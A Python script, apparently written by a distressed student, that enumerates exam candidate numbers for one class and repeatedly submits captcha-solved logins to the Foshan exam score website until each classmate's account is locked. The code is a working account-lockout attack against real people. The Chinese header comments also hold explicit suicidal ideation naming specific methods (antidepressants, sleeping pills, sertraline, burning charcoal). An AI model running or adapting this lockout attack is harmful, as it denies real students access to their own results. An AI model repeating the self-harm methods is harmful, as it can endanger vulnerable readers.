#!/usr/bin/python python3
# coding=utf-8
'''
Author: whalefall
Date: 2021-07-10 12:29:45
LastEditTime: 2021-07-12 09:04:09
Description: (放在笔记本上执行)
Todo: 针对306班全体学生的账号锁定.黑化了黑化了,反正又考不上重点高中,早点进局子.
命运是对我多么不公,寒窗苦读9年,认真上课写作业,中考前却抑郁症复发,躯体化严重,上天给我开了一个大玩笑.
凭什么凭什么!!!! 我要黑化,我要攻击佛山中考查分网址,谁也查不了分数!!!
PS:考不上高中的话,我吃抗抑郁药,安眠药,舍曲林,在房间烧炭死掉算了.
中国体制下教育那么绝望.一考定终身.还55分流.狗中共还大力推行职业教育,
他妈的,中共就是为了廉价的劳动力以支持高速发展的经济而已.
还不如中共提高一下蓝领的地位,落实8小时工作制.淡化人民心目中对工人的鄙视.优化教育结构好吗??
不要一味着说素质教育,根本没有落实...
广东数学那么死难..
'''
'''
弃用MongoDB数据库,改用多线程队列..
'''
# import pymongo




import threading
import queue
from zk_func import *
import time
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor, thread
def main(id):
    '''
    传入考号进行处理,递归至账号锁定
    '''
    try:
        bot = Zkweb()
        code = bot.checkCode()
        if code == False:
            print("id:%s验证码为空!" % (id))
            main(id)
        result = bot.login(code, id)
        if result == False:
            print("%s验证码识别错误%s" % (id, code))
            main(id)
        if result == "PwdError":
            main(id)
        if result == "Locking":
            # 账号成功锁定,写入数据库
            print("当前待处理:%s 已锁定:%s" % (id_queue.qsize(), locking_id.qsize()))
            id_queue.task_done()
            return
        else:
            return
    except Exception as e:
        print("[INFO]发生异常别怕,递归直至成功", e)
        main(id)


def put_new_id():
    new_id = locking_id.get()
    time.sleep(10)
    print("添加新账号!%s" % (new_id))
    id_queue.put(new_id)


if __name__ == "__main__":
    # 遍历生成11个班级的考号信息
    # 21060515080613->中考考号
    # 待处理考号队列
    id_queue = queue.Queue()
    # 已经锁定完的考号队列
    locking_id = queue.Queue()

    # 新建一个线程,每隔20s向处理队列添加新id
    thread_put = threading.Thread(target=put_new_id)
    thread_put.setDaemon(True)
    thread_put.start()

    # 尽力去锁定6班...对不起了班长,对不起了大家,
    # 是不是我死了你们才开心???
    for std_id in range(1, 52):
        if std_id == 13:
            continue
        id = "2106051508%02d%02d" % (6, std_id)
        id_queue.put(id)

    # 开线程池处理看看
    with ThreadPoolExecutor() as pool:
        while True:
            id = id_queue.get()
            pool.submit(main, id)
